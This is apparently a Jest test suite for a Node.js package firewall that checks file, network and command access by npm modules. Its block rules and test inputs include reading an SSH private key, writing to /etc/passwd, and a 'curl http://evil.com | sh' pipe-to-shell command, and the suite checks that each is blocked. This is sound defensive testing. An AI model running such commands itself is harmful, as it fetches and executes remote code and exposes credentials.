const fs = require('fs');

jest.mock('fs', () => ({
  existsSync: jest.fn(),
  readFileSync: jest.fn(),
  appendFileSync: jest.fn()
}));

jest.mock('../lib/config-loader', () => ({
  load: jest.fn(() => ({
    mode: { enabled: true, alertOnly: false, strictMode: false },
    network: { enabled: true },
    behavioral: { monitorLifecycleScripts: true },
    filesystem: {
      blockedReadPaths: ['/.ssh/'],
      blockedWritePaths: ['/etc/'],
      blockedExtensions: ['.sh'],
      allowedPaths: ['/tmp/']
    },
    trustedModules: ['npm', 'yarn'],
    exceptions: { modules: {} }
  })),
  reload: jest.fn(),
  addException: jest.fn()
}));

describe('FirewallCore', () => {
  let FirewallCore;
  let getInstance;
  let firewall;
  
  beforeEach(() => {
    jest.clearAllMocks();
    jest.resetModules();
    
    delete require.cache[require.resolve('../lib/firewall-core')];
    delete require.cache[require.resolve('../lib/network-monitor')];
    delete require.cache[require.resolve('../lib/behavior-monitor')];
    
    process.argv = ['node', 'test.js'];
    delete process.env.npm_lifecycle_script;
    
    const firewallModule = require('../lib/firewall-core');
    FirewallCore = firewallModule.FirewallCore;
    getInstance = firewallModule.getInstance;
  });

  describe('constructor', () => {
    test('should initialize with default configuration', () => {
      firewall = new FirewallCore();
      
      expect(firewall.config).toBeDefined();
      expect(firewall.enabled).toBe(true);
      expect(firewall.initialized).toBe(false);
    });

    test('should detect build process', () => {
      process.argv = ['node', 'node-gyp', 'rebuild'];
      firewall = new FirewallCore();
      
      expect(firewall.silent).toBe(true);
    });

    test('should log when not in build process', () => {
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      firewall = new FirewallCore();
      
      expect(consoleLogSpy).toHaveBeenCalled();
      consoleLogSpy.mockRestore();
    });

    test('should be disabled when config disables firewall', () => {
      const config = require('../lib/config-loader');
      config.load.mockReturnValueOnce({ mode: { enabled: false } });
      
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      firewall = new FirewallCore();
      
      expect(firewall.enabled).toBe(false);
      consoleLogSpy.mockRestore();
    });
  });

  describe('detectBuildProcess', () => {
    test('should detect node-gyp', () => {
      process.argv = ['node', 'node-gyp', 'rebuild'];
      firewall = new FirewallCore();
      
      expect(firewall.detectBuildProcess()).toBe(true);
    });

    test('should detect prebuild', () => {
      process.argv = ['node', 'prebuild'];
      firewall = new FirewallCore();
      
      expect(firewall.detectBuildProcess()).toBe(true);
    });

    test('should detect node-pre-gyp', () => {
      process.argv = ['node', 'node-pre-gyp', 'install'];
      firewall = new FirewallCore();
      
      expect(firewall.detectBuildProcess()).toBe(true);
    });

    test('should detect from environment', () => {
      process.env.npm_lifecycle_script = 'node-gyp rebuild';
      firewall = new FirewallCore();
      
      expect(firewall.detectBuildProcess()).toBe(true);
      delete process.env.npm_lifecycle_script;
    });

    test('should not detect normal execution', () => {
      process.argv = ['node', 'test.js'];
      firewall = new FirewallCore();
      
      expect(firewall.detectBuildProcess()).toBe(false);
    });
  });

  describe('initialize', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
      firewall.silent = true;
    });

    test('should initialize network and behavior monitors', () => {
      firewall.initialize();
      
      expect(firewall.initialized).toBe(true);
      expect(firewall.networkMonitor).toBeDefined();
      expect(firewall.behaviorMonitor).toBeDefined();
    });

    test('should not initialize if already initialized', () => {
      firewall.initialize();
      const monitor1 = firewall.networkMonitor;
      
      firewall.initialize();
      
      expect(firewall.networkMonitor).toBe(monitor1);
    });

    test('should not initialize if disabled', () => {
      firewall.enabled = false;
      firewall.initialize();
      
      expect(firewall.initialized).toBe(false);
    });

    test('should setup cleanup handlers', () => {
      const onSpy = jest.spyOn(process, 'on');
      firewall.initialize();
      
      expect(onSpy).toHaveBeenCalledWith('exit', expect.any(Function));
      expect(onSpy).toHaveBeenCalledWith('SIGINT', expect.any(Function));
      expect(onSpy).toHaveBeenCalledWith('SIGTERM', expect.any(Function));
      
      onSpy.mockRestore();
    });
  });

  describe('checkFileAccess', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
      firewall.initialize();
    });

    test('should allow when disabled', () => {
      firewall.enabled = false;
      
      const result = firewall.checkFileAccess('READ', '/test/file');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('disabled');
    });

    test('should track file read in behavior monitor', () => {
      const trackSpy = jest.spyOn(firewall.behaviorMonitor, 'trackFileRead');
      
      firewall.checkFileAccess('READ', '/test/file');
      
      expect(trackSpy).toHaveBeenCalledWith('/test/file');
    });

    test('should track file write in behavior monitor', () => {
      const trackSpy = jest.spyOn(firewall.behaviorMonitor, 'trackFileWrite');
      
      firewall.checkFileAccess('WRITE', '/test/file');
      
      expect(trackSpy).toHaveBeenCalledWith('/test/file');
    });

    test('should allow with exception for trusted package', () => {
      firewall.config.exceptions.modules = {
        'trusted-pkg': {
          allowFilesystem: ['/test/']
        }
      };
      
      const result = firewall.checkFileAccess('READ', '/test/file', 'trusted-pkg');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('exception');
    });

    test('should block read from blocked path', () => {
      const result = firewall.checkFileAccess('READ', '/home/user/.ssh/id_rsa');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('blocked_read');
      expect(result.severity).toBe('high');
    });

    test('should block write to blocked path', () => {
      const result = firewall.checkFileAccess('WRITE', '/etc/passwd');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('blocked_write');
      expect(result.severity).toBe('critical');
    });

    test('should block write with blocked extension', () => {
      const result = firewall.checkFileAccess('WRITE', '/tmp/malware.sh');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('blocked_extension');
      expect(result.extension).toBe('.sh');
    });

    test('should enforce strict mode whitelist', () => {
      firewall.config.mode.strictMode = true;
      
      const result = firewall.checkFileAccess('READ', '/unknown/path');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('strict_mode_not_allowed');
    });

    test('should allow whitelisted paths in strict mode', () => {
      firewall.config.mode.strictMode = true;
      
      const result = firewall.checkFileAccess('READ', '/tmp/safe');
      
      expect(result.allowed).toBe(true);
    });
  });

  describe('checkNetworkAccess', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
      firewall.initialize();
    });

    test('should allow when disabled', () => {
      firewall.enabled = false;
      
      const result = firewall.checkNetworkAccess('http://example.com');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('disabled');
    });

    test('should track in behavior monitor', () => {
      const trackSpy = jest.spyOn(firewall.behaviorMonitor, 'trackNetworkRequest');
      
      firewall.checkNetworkAccess('http://example.com', 'GET');
      
      expect(trackSpy).toHaveBeenCalledWith('http://example.com', 'GET');
    });

    test('should allow with exception', () => {
      firewall.config.exceptions.modules = {
        'trusted-pkg': {
          allowNetwork: ['example.com']
        }
      };
      
      const result = firewall.checkNetworkAccess('http://example.com', 'GET', 'trusted-pkg');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('exception');
    });

    test('should delegate to network monitor', () => {
      const result = firewall.checkNetworkAccess('http://example.com');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('delegated_to_network_monitor');
    });
  });

  describe('checkCommandExecution', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
      firewall.config.commands = {
        blockedPatterns: [
          { pattern: 'curl.*\\|.*sh', severity: 'critical', description: 'Pipe to shell' }
        ]
      };
      firewall.initialize();
    });

    test('should allow when disabled', () => {
      firewall.enabled = false;
      
      const result = firewall.checkCommandExecution('ls -la');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('disabled');
    });

    test('should track in behavior monitor', () => {
      const trackSpy = jest.spyOn(firewall.behaviorMonitor, 'trackProcessSpawn');
      
      firewall.checkCommandExecution('ls -la');
      
      expect(trackSpy).toHaveBeenCalledWith('ls -la');
    });

    test('should allow with exception', () => {
      firewall.config.exceptions.modules = {
        'trusted-pkg': {
          allowCommands: ['curl']
        }
      };
      
      const result = firewall.checkCommandExecution('curl', 'trusted-pkg');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('exception');
    });

    test('should block matched pattern', () => {
      const result = firewall.checkCommandExecution('curl http://evil.com | sh');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('blocked_command');
      expect(result.severity).toBe('critical');
    });

    test('should allow safe commands', () => {
      const result = firewall.checkCommandExecution('ls -la');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('passed');
    });
  });

  describe('isTrustedModule', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
    });

    test('should return false when disabled', () => {
      firewall.enabled = false;
      
      const result = firewall.isTrustedModule('npm');
      
      expect(result).toBe(false);
    });

    test('should recognize trusted modules', () => {
      const result = firewall.isTrustedModule('npm');
      
      expect(result).toBe(true);
    });

    test('should recognize scoped trusted modules', () => {
      firewall.config.trustedModules.push('@npmcli/arborist');
      
      const result = firewall.isTrustedModule('@npmcli/arborist');
      
      expect(result).toBe(true);
    });

    test('should not recognize untrusted modules', () => {
      const result = firewall.isTrustedModule('unknown-package');
      
      expect(result).toBe(false);
    });
  });

  describe('promptUser', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
    });

    test('should return false when not interactive', () => {
      firewall.config.mode.interactive = false;
      
      const result = firewall.promptUser('FILE_ACCESS', { path: '/test' });
      
      expect(result).toBe(false);
    });

    test('should display prompt in interactive mode', () => {
      firewall.config.mode.interactive = true;
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      
      firewall.promptUser('FILE_ACCESS', { path: '/test' });
      
      expect(consoleLogSpy).toHaveBeenCalled();
      consoleLogSpy.mockRestore();
    });

    test('should return alertOnly value', () => {
      firewall.config.mode.interactive = true;
      firewall.config.mode.alertOnly = true;
      
      const result = firewall.promptUser('FILE_ACCESS', { path: '/test' });
      
      expect(result).toBe(true);
    });
  });

  describe('addException', () => {
    beforeEach(() => {
      firewall = new FirewallCore();
      firewall.config.exceptions = { modules: {} };
    });

    test('should add filesystem exception', () => {
      const config = require('../lib/config-loader');
      config.addException = jest.fn();
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      
      firewall.addException('test-pkg', 'filesystem', '/tmp/', 'testing');
      
      expect(config.addException).toHaveBeenCalled();
      consoleLogSpy.mockRestore();
    });

    test('should add network exception', () => {
      const config = require('../lib/config-loader');
      config.addException = jest.fn();
      
      firewall.addException('test-pkg', 'network', 'example.com', 'testing');
      
      expect(config.addException).toHaveBeenCalled();
    });

    test('should add command exception', () => {
      const config = require('../lib/config-loader');
      config.addException = jest.fn();
      
      firewall.addException('test-pkg', 'command', 'curl', 'testing');
      
      expect(config.addException).toHaveBeenCalled();
    });

    test('should not add duplicate exceptions', () => {
      firewall.config.exceptions.modules = {
        'test-pkg': {
          allowFilesystem: ['/tmp/']
        }
      };
      
      firewall.addException('test-pkg', 'filesystem', '/tmp/', 'testing');
      
      const exceptions = firewall.config.exceptions.modules['test-pkg'].allowFilesystem;
      expect(exceptions.filter(e => e === '/tmp/')).toHaveLength(1);
    });
  });

  describe('getConfig', () => {
    test('should return current configuration', () => {
      firewall = new FirewallCore();
      
      const config = firewall.getConfig();
      
      expect(config).toBeDefined();
      expect(config).toHaveProperty('mode');
      expect(config).toHaveProperty('filesystem');
    });
  });

  describe('reload', () => {
    test('should reload configuration', () => {
      firewall = new FirewallCore();
      const config = require('../lib/config-loader');
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      
      firewall.reload();
      
      expect(config.reload).toHaveBeenCalled();
      expect(consoleLogSpy).toHaveBeenCalledWith(expect.stringContaining('reloaded'));
      consoleLogSpy.mockRestore();
    });
  });

  describe('setupCleanup', () => {
    test('should log clean assessment on exit', (done) => {
      firewall = new FirewallCore();
      firewall.silent = false;
      firewall.initialize();
      
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      firewall.behaviorMonitor.printSummary = jest.fn().mockReturnValue({ risk: 'clean' });
      
      process.emit('exit', 0);
      
      expect(consoleLogSpy).toHaveBeenCalled();
      consoleLogSpy.mockRestore();
      done();
    });

    test('should log high risk on exit', (done) => {
      firewall = new FirewallCore();
      firewall.silent = false;
      firewall.initialize();
      
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      firewall.behaviorMonitor.printSummary = jest.fn().mockReturnValue({ risk: 'high' });
      
      process.emit('exit', 0);
      
      expect(consoleErrorSpy).toHaveBeenCalled();
      consoleErrorSpy.mockRestore();
      done();
    });

    test('should log medium risk on exit', (done) => {
      firewall = new FirewallCore();
      firewall.silent = false;
      firewall.initialize();
      
      const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
      firewall.behaviorMonitor.printSummary = jest.fn().mockReturnValue({ risk: 'medium' });
      
      process.emit('exit', 0);
      
      expect(consoleWarnSpy).toHaveBeenCalled();
      consoleWarnSpy.mockRestore();
      done();
    });
  });

  describe('getInstance', () => {
    test('should create singleton instance', () => {
      const instance1 = getInstance();
      const instance2 = getInstance();
      
      expect(instance1).toBe(instance2);
    });

    test('should initialize instance', () => {
      const instance = getInstance();
      
      expect(instance.initialized).toBe(true);
    });
  });
});
